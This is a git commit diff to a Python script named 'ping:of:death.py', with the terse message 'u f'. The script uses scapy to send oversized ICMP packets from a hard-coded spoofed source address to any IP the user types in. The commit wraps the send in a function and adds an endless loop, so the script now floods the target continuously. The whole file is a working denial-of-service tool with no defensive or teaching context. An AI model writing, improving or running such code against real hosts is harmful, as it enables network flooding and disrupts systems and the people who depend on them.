58d7a2ab0c7b6458d13c105454f0915a610585dc
Thien Tan <nttansv@gmail.com>
2022-03-16 02:35:50 +0000

    u f

--- ping:of:death.py
+++ ping:of:death.py
@@ -1,12 +1,16 @@
+from ast import While
 from scapy.all import *
 
 ip = input("IP: ")
 
-# Change according with your IP addresses
-SOURCE_IP="192.168.2.102"
-TARGET_IP=ip
-MESSAGE="T"
-NUMBER_PACKETS=5 # Number of pings
+def POF(ip):
+    SOURCE_IP="192.168.2.102"
+    TARGET_IP=ip
+    MESSAGE="T"
+    NUMBER_PACKETS=5
 
-pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*60000)
-send(NUMBER_PACKETS*pingOFDeath)
+    pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*60000)
+    send(NUMBER_PACKETS*pingOFDeath)
+
+while(True):
+    POF(ip)
